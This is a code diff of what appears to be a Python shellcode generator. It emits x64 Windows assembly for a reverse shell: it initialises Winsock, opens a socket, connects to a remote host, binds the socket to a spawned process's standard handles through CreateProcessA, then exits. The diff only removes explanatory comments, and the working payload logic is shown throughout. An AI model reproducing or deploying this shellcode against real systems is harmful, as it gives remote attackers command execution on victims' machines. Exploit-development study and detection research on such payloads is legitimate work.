@@ -262,20 +262,12 @@ _start:
         shellcode += self.resolve_functions()
         
         shellcode += f"""
-; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX
-;                   [out] LPWSADATA lpWSAData);       // RDX
 call_WSAStartup:
     mov rcx, 0x202
     lea rdx, [rbp - {self.storage_offsets['wsaData']}]
     mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
-; RAX => WSASocketA([in] int                 af,              // RCX
-;                   [in] int                 type,            // RDX
-;                   [in] int                 protocol,        // R8
-;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9
-;                   [in] GROUP               g,               // RSP+0x20
-;                   [in] DWORD               dwFlags);        // RSP+0x28
 call_WSASocketA:
     mov ecx, {ws2def.AF_INET}
     mov edx, {winsock2.SOCK_STREAM}
@@ -285,11 +277,8 @@ call_WSASocketA:
     mov [rsp+0x28], r9
     mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
     call rax
-    mov rsi, rax ; save the socket file descriptor (sockfd)
+    mov rsi, rax
 
-; RAX => connect([in] SOCKET s,
-;                [in] const sockaddr *name,
-;                [in] int namelen);
 call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
@@ -301,13 +290,12 @@ call_connect:
     mov rax, [rbp - {self.storage_offsets['connect']}]
     call rax
 
-; [RBX] => typedef struct _STARTUPINFOA {{ }}
 memset_STARTUPINFOA:
-    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]  ; RDI = Destination ( memset(rdi, value, x) )
-    mov rbx, rdi                                            ; Backup the pointer to the start of _STARTUPINFOA pointer
-    xor eax, eax                                            ; EAX = 0x00 (value)
-    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}            ; 0x20 * sizeof(DWORD) = (x -> 0x80)
-    rep stosd                                               ; Zero out x bytes
+    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]
+    mov rbx, rdi
+    xor eax, eax
+    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}
+    rep stosd
 
 init_STARTUPINFOA:
     mov eax, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
@@ -319,16 +307,6 @@ init_STARTUPINFOA:
     mov [rbx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], rsi
     mov [rbx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], rsi
 
-; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX
-;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9
-;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20
-;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28
-;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30
-;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38
-;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40
-;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48
 call_CreateProccessA:
     xor ecx, ecx
     mov rdx, rbp
@@ -351,8 +329,6 @@ call_CreateProccessA:
     mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
     call rax
 
-; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
-;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
 call_TerminateProcess:
 	xor rcx, rcx
 	dec rcx
